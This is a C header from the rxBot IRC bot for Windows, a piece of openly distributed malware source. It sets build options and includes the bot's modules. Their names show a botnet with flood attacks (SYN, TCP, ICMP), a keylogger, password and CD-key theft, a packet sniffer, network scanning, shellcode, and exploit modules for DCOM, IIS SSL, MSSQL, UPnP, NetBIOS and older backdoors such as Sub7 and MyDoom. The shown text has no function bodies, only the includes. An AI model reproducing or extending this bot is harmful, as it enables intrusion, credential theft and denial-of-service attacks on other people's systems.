/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

#ifdef WIN32
#define _WIN32_WINNT	0x0403				// Very important for critical sections.
#define WIN32_LEAN_AND_MEAN					// Good to use.
#pragma optimize("gsy", on)					// Global optimization, Short sequences, Frame pointers.
//#pragma comment(linker,"/RELEASE")			// Release code
#pragma comment(linker, "/ALIGN:4096")		// This will save you some size on the executable.
//#pragma comment(linker, "/IGNORE:4108 ")	// This is only here for when you use /ALIGN:4096.
//#pragma pack(1)								// Force packing on byte boundaries.
#endif // WIN32

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <malloc.h>
#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <windns.h>
#include <iphlpapi.h>
#include <lm.h>
#include <lmat.h>
#include <io.h>
#include <fcntl.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <assert.h>
#include <sqlext.h>
#include <vfw.h>
#include <shlobj.h>
#include <ntsecapi.h>
#include "defines.h"
#include "ehandler.h"
#include "startup.h"
#include "connect.h"
#include "protocol.h"
#include "commands.h"
#include "processes.h"
#include "loaddlls.h"
#include "tcpip.h"
#include "threads.h"
#include "rxbot.h"
#include "irc_send.h"
#include "crc32.h"
#include "netutils.h"
#include "sysinfo.h"
#include "advscan.h"
#include "ident.h"
#include "rndnick.h"
#include "socks4.h"
#include "download.h"
#include "ftptransfer.h"
#include "synflood.h"
#include "tcpflood.h"
#include "icmpflood.h"
#include "pingudp.h"
#include "redirect.h"
#include "wildcard.h"
#include "misc.h"
#include "driveinfo.h"
#include "dcc.h"
#include "httpd.h"
#include "crypt.h"
#include "visit.h"
#include "tftpd.h"
#include "cdkeys.h"
#include "remotecmd.h"
#include "aliaslog.h"
#include "psniff.h"
#include "net.h"
#include "secure.h"
#include "lsarestrict.h"
#include "autostart.h"
#include "capture.h"
#include "keylogger.h"
#include "session.h"
#include "rlogind.h"
#include "findpass.h"
#include "findfile.h"
#include "netbios.h"
#include "kuang2.h"
#include "netdevil.h"
#include "sub7.h"
#include "fphost.h"
#include "shellcode.h"
#include "dcom.h"
#include "mydoom.h"
#include "mssql.h"
#include "optix.h"
#include "beagle.h"
#include "dameware.h"
#include "iis5ssl.h"
#include "upnp.h"
